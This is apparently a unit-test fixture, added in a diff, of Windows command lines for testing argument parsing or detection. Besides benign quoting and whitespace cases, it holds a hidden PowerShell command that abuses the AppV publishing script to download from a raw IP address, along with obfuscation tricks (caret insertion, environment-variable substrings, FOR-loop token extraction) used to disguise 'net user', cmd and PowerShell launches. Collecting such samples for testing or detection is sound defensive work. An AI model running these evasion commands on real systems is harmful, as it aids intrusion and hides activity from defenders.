@@ -1,0 +1,46 @@
+"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe" --type=renderer /prefetch:1  "R:\Coficine\MCI\01 Activités\03 PARTICIPATIONS\2 Sociétés\1 Particip. actuelles\Monello Productions\03. Dossier client\01. KYC\Actionnariat\Actionnariat - 2018-05-03.pdf"
+
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &amp;{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer  \n;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri http://209.97.141.246/ee/index_files/alert.css}
+
+"UNIT TESTS :"
+
+''
+ arg0\ \ \\ "arg1\"\""  	 "arg2\"\\""arg3 \"" 'arg4"arg4"' arg5	arg6 
+
+ space_bef_and_aft__arg0 arg1 arg2 arg3 
+space_aft___________arg0 arg1 arg2 arg3  
+ space_bef__________arg0 arg1 arg2 arg3
+nospace_____________arg0 arg1 arg2 arg3
+
+  multispace______________arg0   arg1  arg2	 	 	 arg3       arg4 
+
+ C:\ProgramData\Anaconda3\python.exe C:\ProgramData\Anaconda3\cwp.py C:\ProgramData\Anaconda3 C:\ProgramData\Anaconda3\python.exe C:\ProgramData\Anaconda3\Scripts\jupyter-notebook-script.py "%USERPROFILE%/" 
+
+.
+
+`echo `ls "/tmp"``'``'
+
+1""3"4"
+
+n^e^t u^s^er
+
+cmd /c "set x=calc & echo %x% | cmd"
+cmd /c "set x=c@alc & echo %x:@=mantvydas% | cmd"
+
+\c \\ \' \" '\'\'\'\'\'\'\'\\' 
+
+'# this will take the C character from %programdata% and will launch the cmd prompt'
+%programdata:~0,1%md \c "whatever"
+
+@cmd
+set pSM 
+PSModulePath=C:\Users\mantvydas\Documents\WindowsPowerShell\Modules;....
+
+FOR /F "tokens=7 delims=s\\" %g IN ('set^|findstr PSM') do %g
+
+cmd,/c;hostname
+
+
+
+
+
